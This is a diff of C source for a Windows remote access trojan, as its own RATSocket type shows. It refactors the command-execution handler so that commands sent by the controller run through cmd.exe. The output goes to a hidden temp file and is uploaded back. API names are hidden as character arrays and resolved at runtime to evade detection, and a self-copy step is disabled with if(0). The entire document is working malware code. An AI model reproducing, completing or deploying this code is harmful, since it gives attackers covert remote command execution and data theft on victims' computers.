@@ -205,9 +205,7 @@ UploadFile(RATSocket* ratSocket,
 	}
 }
 
-int
-ReceiveCmdCommand(RATSocket* ratSocket,
-				  char* splittedCommand[SPLIT_STRING_ARRAY_SIZE])
+void RunCommandInProcess(char *commandToRun)
 {
 	PROCESS_INFORMATION pi;
 	STARTUPINFO si = { };
@@ -222,32 +220,8 @@ ReceiveCmdCommand(RATSocket* ratSocket,
 	char ca_cmdexe[] = { '\\','c','m','d','.','e','x','e',0 };
 	strncat_s(cmdPath, ca_cmdexe, 8);
 
-	char tempPath[MAX_PATH];
-
-	char ca_GetTempPathA[] = { 'G','e','t','T','e','m','p','P','a','t','h','A',0 };
-	_GetTempPathA* f_GetTempPathA = (_GetTempPathA*)GetProcAddress(gLibraryKernel32, ca_GetTempPathA);
-	f_GetTempPathA(MAX_PATH, tempPath);
-
-	char cmdArg[MAX_PATH + 8 + 3 + sizeof(tempPath)] = { '/','C',' ',0 };
-
-	int commandIndex = 1;
-	while ( splittedCommand[commandIndex] != NULL )
-	{
-		strncat_s(cmdArg, splittedCommand[commandIndex], sizeof(splittedCommand[commandIndex]));
-		strncat_s(cmdArg, " ", 1);
-		commandIndex++;
-	}
-
-	char randomFileName[11] = {};
-	GenerateRandomString(randomFileName, 6);
-	strncat_s(randomFileName, ".tmp", 4);
-
-	char filePath[MAX_PATH];
-	strncpy_s(filePath, MAX_PATH, tempPath, strlen(tempPath));
-	strncat_s(filePath, randomFileName, 10);
-
-	strncat_s(cmdArg, " > ", 3);
-	strncat_s(cmdArg, filePath, strlen(tempPath) + 10);
+	char cmdArg[MAX_PATH + 8 + 3] = { '/','C',' ',0 };
+	strncat_s(cmdArg, commandToRun, strlen(commandToRun));
 
 	char ca_CreateProcessA[] = { 'C','r','e','a','t','e','P','r','o','c','e','s','s','A',0 };
 	_CreateProcessA* f_CreateProcessA = (_CreateProcessA*)GetProcAddress(gLibraryKernel32, ca_CreateProcessA);
@@ -266,6 +240,40 @@ ReceiveCmdCommand(RATSocket* ratSocket,
 
 	gf_CloseHandle(pi.hProcess);
 	gf_CloseHandle(pi.hThread);
+}
+
+int
+ReceiveCmdCommand(RATSocket* ratSocket,
+				  char* splittedCommand[SPLIT_STRING_ARRAY_SIZE])
+{
+	char commandToRun[MAX_PATH] = {};
+
+	int commandIndex = 1;
+	while ( splittedCommand[commandIndex] != NULL )
+	{
+		strncat_s(commandToRun, splittedCommand[commandIndex], sizeof(splittedCommand[commandIndex]));
+		strncat_s(commandToRun, " ", 1);
+		commandIndex++;
+	}
+
+	char randomFileName[11] = {};
+	GenerateRandomString(randomFileName, 6);
+	strncat_s(randomFileName, ".tmp", 4);
+
+	char tempPath[MAX_PATH];
+
+	char ca_GetTempPathA[] = { 'G','e','t','T','e','m','p','P','a','t','h','A',0 };
+	_GetTempPathA* f_GetTempPathA = (_GetTempPathA*)GetProcAddress(gLibraryKernel32, ca_GetTempPathA);
+	f_GetTempPathA(MAX_PATH, tempPath);
+	
+	char filePath[MAX_PATH];
+	strncpy_s(filePath, MAX_PATH, tempPath, strlen(tempPath));
+	strncat_s(filePath, randomFileName, 10);
+
+	strncat_s(commandToRun, " > ", 3);
+	strncat_s(commandToRun, filePath, strlen(tempPath) + 10);
+	
+	RunCommandInProcess(commandToRun);
 
 	UploadFile(ratSocket, filePath);
 
@@ -310,7 +318,7 @@ WinMain(HINSTANCE hInstance,
 	strncpy_s(newPath, MAX_PATH, tempPath, strlen(tempPath));
 	strncat_s(newPath, "rtwst.tmp", 9);
 
-	if ( strcmp(currentPath, newPath) != 0 )
+	if ( 0 ) //strcmp(currentPath, newPath) != 0 )
 	{
 		char ca_CopyFileA[] = { 'C','o','p','y','F','i','l','e','A',0 };
 		_CopyFileA* f_CopyFileA = (_CopyFileA*)GetProcAddress(gLibraryKernel32, ca_CopyFileA);
